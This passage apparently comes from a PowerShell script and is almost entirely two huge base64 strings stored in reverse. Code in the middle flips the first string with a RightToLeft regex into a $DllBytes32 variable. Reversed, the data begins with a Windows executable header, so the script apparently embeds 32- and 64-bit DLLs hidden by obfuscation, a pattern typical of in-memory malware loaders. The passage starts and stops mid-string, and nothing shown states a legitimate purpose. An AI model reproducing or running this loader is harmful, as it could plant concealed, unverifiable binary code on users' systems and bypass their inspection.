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"
    $klass32 = ([regex]::Matches($zstring32,'.','RightToLeft') | ForEach {$_.value}) -join ''
    $DllBytes32 = $klass32

    $ztring64 = "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